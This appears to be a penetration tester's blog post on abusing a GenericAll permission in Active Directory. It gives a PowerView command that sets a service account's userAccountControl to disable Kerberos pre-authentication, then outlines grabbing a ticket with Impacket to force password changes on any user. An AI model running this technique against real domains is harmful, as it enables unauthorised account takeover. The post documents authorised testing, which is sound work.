[Home](https://plackyhacker.github.io)

# Changing the userAccountControl Attribute in AD

Recently I was conducting some technical testing, specifically permissions and privileges that users have in AD. During the tests I found that a group containing low privileged users had the `GenericAll` permission over a service account that had the `ForceChangePassword` permission over ALL user accounts in the domain.

I used Bloodhound to analyse these:

<img width="732" alt="Screenshot 2023-02-18 at 17 21 51" src="https://user-images.githubusercontent.com/42491100/219879488-f09b9da4-a189-475a-92e0-f16dd4ec51e3.png">

The image is for illustrative purposes only, there is more than 3 user accounts in the domain!

I couldn't change the service account password as it would break the underlying service. So I decided to briefly change the `userAccountControl` attribute on the object so I could get a Kerberos Ticket Granting Ticket for the account and abuse it that way instead. I used `PowerView` to do this:

```powershell
 . .\PowerView.ps1
$username = "low.priv.account@domain.local";
$password = ConvertTo-SecureString "PASSWORD_HERE" -AsPlainText -Force;
$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $username, $password;

Set-DomainObject -Identity 'target.account' -Set @{'userAccountControl'=0x410200} -Credential $cred -Domain "domain.local" -Server '172.16.1.5'; 
```

The setting I made breaks down as follows:

```
NORMAL_ACCOUNT       0x0200
DONT_EXPIRE_PASSWORD 0x10000
DONT_REQ_PREAUTH     0x400000
```

More settings can be refered to at:

https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties

The initial attribute value was `0x10200`.

I could then grab a TGT (using Impacket GetNPUsers), force a password change on any user, and change the attribute back.

[Home](https://plackyhacker.github.io)
